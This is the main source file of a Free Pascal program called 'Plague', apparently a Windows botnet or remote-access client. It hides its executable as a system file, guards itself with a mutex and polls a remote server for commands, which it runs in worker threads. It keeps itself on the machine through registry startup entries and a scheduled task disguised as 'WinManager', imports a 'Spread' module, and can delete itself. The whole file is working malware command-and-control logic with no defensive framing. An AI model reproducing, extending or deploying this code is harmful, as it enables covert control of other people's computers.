program Plague;

{$mode objfpc}{$H+}

uses
  NetModule, Tools, Spread,
  Classes, Windows, SysUtils, CmdWorker;

var
  J, I: LongInt;
  CmdID, ToAbort: String;

  ExceptionCount: LongInt;

{$R *.res}

Begin
  ExceptionCount:=0;
  SetLastError(0);

  if ParamStr(1)='/open' then ShellExecute(0, 'open', 'explorer.exe',
    PChar(ParamStr(2)), nil, SW_NORMAL);
  LoadSettings;
  Initialize;
  if ParamStr(1)='/wait' then Sleep(Delay+200);
  if ParamStr(2)='/removeold' then Begin
    if FileExists(FullName+'.old') then DeleteFile(FullName+'.old');
    FileSetAttr(FileName, faHidden{%H-} or faSysFile{%H-});
  end;
  if Settings.ReadInteger('General', 'FirstRun', 1) = 1 then DoFirstRun;
  MutexMagic;
  if DirectoryExists(Base) then ChDir(Base);

  CheckProxy;
  {$IFDEF Debug}
  if UsingProxy then Begin
    Writeln('Using system-wide proxy settings:');
    Writeln('  ',ProxyIP);
    Writeln('  ',ProxyPort);
    Writeln;
  end else Writeln('No proxy server detected.'+sLineBreak);
  {$ENDIF}

  {$IFDEF Debug}
  Writeln('SecMapping = ', Settings.ReadString('General', 'SecMapping', 'Unknown'),sLineBreak);
  {$ENDIF}

  Net:=TNet.Create(Nil);
  Repeat
    try
    Net.GetCommands;
    //Only count consecutive exceptions, so...
    ExceptionCount:=0;
    {$IFDEF Debug}
    Writeln('Commands = ', Net.CommandCount);
    {$ENDIF}
    For J:=1 to Net.CommandCount do Begin
      CmdID:=Net.GetCommandID(J);
      //Check if it is an Abort command
      if Net.Commands.ReadString(CmdID, 'Type', '')='Abort' then Begin
        ToAbort:=Net.Commands.ReadString(CmdID, 'CommandID', '');
        I:=ExecIndex(ToAbort);
        if I>-1 then Begin
          {$IFDEF Debug}
          Writeln('ABORT: Thread #',I);
          {$ENDIF}
          Workers[I].Abort(CmdID);
        end {$IFDEF Debug} else Writeln('ABORT: Thread not found!'); {$ENDIF}
      end else Begin
        //Check if commands are already under execution
        I:=ExecIndex(CmdID);
        if I=-1 then Begin
          I:=FindAPlace;
          {$IFDEF Debug}
          Writeln('Command ',Net.Commands.ReadString(CmdID, 'Type', '???'),
          ' --> Worker #'+IntToStr(I)+'.');
          {$ENDIF}
          Workers[I]:=TCmdWorker.Create(CmdID, I);
        end;
      end;
    end;
    //Readln;
    Sleep(Delay);
    except on E: Exception do
      if ExceptionCount>=10 then Begin
        {$IFDEF Debug}
        Writeln(E.ToString);
        Writeln('Exception limit reached. Halting.');
        {$ENDIF}
        Halt(1);
      end else Begin
        Inc(ExceptionCount);
        {$IFDEF Debug}
        Writeln('[',ExceptionCount,'] Fatal exception encountered:');
        Writeln(E.Message);
        {$ENDIF}
      end;
    end;
  until Not(AllowExecution);
  //Forcefully terminate the other threads
  {$IFDEF Debug}
  Writeln;
  Writeln('Terminating worker threads...');
  {$ENDIF}
  For J:=0 to High(Workers) do
  if Assigned(Workers[J]) then Begin
    TerminateThread(Workers[J].Handle, 0);
  end;
  SetLength(Workers, 0);
  Net.Free;
  //Terminate child processes
  {$IFDEF Debug}
  Writeln('Terminating child processes...');
  {$ENDIF}
  For J:=0 to _C-1 do
    TerminateProcessByID(ChildProc[J]);
  SetLength(ChildProc, 0);
  //Clean up
  {$IFDEF Debug}
  Writeln('Cleaning up...');
  ChDel('Clone.tmp');
  Writeln('Done.');
  {$ENDIF}
  if IsRestarting then Restart(FullName) else
  if IsUpdating then Restart(FullName, True) else
  if IsUninstalling then Begin
    Reg_RemoveFromStartup;
    DeleteTask('WinManager');
    ChDel(StartupFolder+'\'+InternalName);
    Selfdestruct;
  end;
  CloseHandle(Mutex);
end.
